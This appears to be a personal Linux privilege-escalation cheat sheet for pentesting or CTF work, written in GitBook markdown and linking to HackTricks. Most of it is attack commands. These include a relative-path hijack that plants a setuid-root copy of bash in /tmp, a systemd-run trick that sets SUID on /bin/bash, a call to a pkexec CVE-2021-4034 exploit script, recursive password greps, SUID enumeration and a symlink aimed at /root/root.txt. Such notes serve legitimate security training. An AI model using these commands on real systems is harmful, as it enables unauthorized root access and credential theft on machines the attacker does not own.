---
icon: linux
---

# Linux Privilege Scalation

* ## <mark style="color:purple;">Get your own local version of this checklist:</mark>

{% embed url="https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist" %}
By Carlos Palop
{% endembed %}

***

{% hint style="info" %}
## <mark style="color:orange;">`sudo`</mark> <mark style="color:purple;">Permissions Chaining</mark>

{% code title="Lists allowed commands" %}
```bash
sudo -l
```
{% endcode %}

***

## <mark style="color:purple;">Relative Path Hijacking</mark>

* <mark style="color:purple;">Sometimes is possible to run scripts as</mark> <mark style="color:orange;">**`sudo`**</mark> <mark style="color:purple;">that call others scripts within the script.</mark>
* <mark style="color:purple;">When this scripts are called by a relative path is possible to create a malicious script on a directory with write permissions.</mark>
* <mark style="color:purple;">This commands creates a script called</mark> <mark style="color:orange;">**`initdb.sh`**</mark> <mark style="color:purple;">that well called will copy</mark> <mark style="color:orange;">**`bash`**</mark> <mark style="color:purple;">to a file called</mark> <mark style="color:purple;"></mark>_<mark style="color:purple;">**shellie**</mark>_ <mark style="color:purple;"></mark><mark style="color:purple;">in the</mark> <mark style="color:orange;">**`/tmp`**</mark> <mark style="color:purple;">folder:</mark>

```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/shellie\nchown root:root /tmp/shellie\nchmod 6777 /tmp/shellie' | tee initdb.sh
```

* <mark style="color:purple;">Once the  malicious script is executed by the vulnerable script, you just need to execute the shell from the</mark> <mark style="color:orange;">**`/tmp`**</mark> <mark style="color:purple;">folder to become</mark> <mark style="color:orange;">**`root`**</mark><mark style="color:purple;">:</mark>

```bash
/tmp/shellie -p 
```
{% endhint %}

























Netstat

```bash
#Option 1
netstat -l

#Ports
netstat -nltp

#More
netstat -rn
```

Look for files

```bash
#SUID
find / -perm -4000 -type f 2>/dev/null
find / -perm -4000 -or -perm -2000 2>/dev/null
#Binaries con capabilities
getcap -r / 2>/dev/null

#Extra info about bin process 
**getfacl** 

#Passwords
grep -iR "pass" *
grep password .*.* -r
#File
grep -ir cri-o . 2>/dev/null

#Look for a specific file
find / -name lcars 2>/dev/null
find / -name root.txt 2>/dev/null

#Inside a file
cat /etc/zabbix/zabbix_server.conf | grep -Ev "^#" | grep .

#Check libraries
ltrace

#Looking for 32 characters file
#hex
grep -aPo '[a-fA-F0-9]{32}' /dev/sdb
#string 32 chars
strings /dev/sdb -n 32
```

User Privileges

```bash
Check user root privileges â€”> sudo -l
```

Port Forwarding

```bash
ssh -L {TARGETPORT}:127.0.01:8000 [sau@](<mailto:sau@10.10.11.214>){TARGETIP}
```

Symbolic Link

```bash
ln -s /root/root.txt t.trace.db
```

Common Vectors

```bash
#systemd-run + bash -p
systemd-run chmod u+s /bin/bash
bash -p

#pkexec
python3 CVE-2021-4034.py
```

Flash drives

```bash
#Enumerate mounted disks
mount
#more
lsblk
```

SUDO

```bash
#Interective shell
sudo -i
#su vuln
sudo su -
```

